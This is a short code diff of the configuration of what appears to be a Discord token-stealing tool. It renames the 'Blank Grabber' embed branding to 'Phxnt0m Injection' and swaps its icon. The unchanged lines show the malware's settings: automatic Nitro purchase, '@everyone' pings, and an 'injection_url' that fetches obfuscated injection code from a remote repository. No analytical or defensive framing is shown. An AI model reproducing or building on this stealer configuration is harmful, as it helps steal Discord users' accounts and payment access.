@@ -16,8 +16,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png', 
+  embed_name: 'Phxnt0m Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1123712233994719305/1124746006496555160/oni_5889166.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
 
